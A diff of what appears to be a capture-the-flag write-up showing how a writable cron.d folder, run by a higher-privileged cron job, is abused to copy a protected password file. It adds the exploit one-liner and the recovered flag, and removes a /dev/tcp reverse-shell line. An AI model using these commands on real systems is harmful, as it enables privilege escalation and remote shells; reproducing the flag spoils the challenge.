@@ -40,18 +40,17 @@ rm -rf cron.d/*
 It executes this script every minute as a higher user (at least I think that what the comment in French says up there.)
 
 It executes all the tasks that located under the folder `cron.d/`, and then deletes them.
-We can 
+We can create our task at `cron.d/`,  
 
+So, simply execute this set of commands:
 ```bash
-#!/bin/bash
-mkdir -p /tmp/LOL
-cp ~/.passwd /tmp/LOL/.passwd
+echo -e '#!/bin/sh\ncat .passwd > /tmp/whatever' > cron.d/my_task;chmod 4777 cron.d/my_task
 ```
 
-```bash
-echo '#!/bin/sh\ncat .passwd > /tmp/whatever' > cron.d/task1;chmod 4777 cron.d/task1
-```
+And now wait for minute, until the cronjob will do his work. 
+Then, you can read the password:
 
 ```bash
-echo '#!/bin/sh\nbash -i >& /dev/tcp/127.0.0.1/1337 0>&1' > cron.d/bla; chmod 4777 cron.d/bla
+app-script-ch4@challenge02:~$ cat /tmp/whatever
+Vys3OS3iStUapDj
 ```
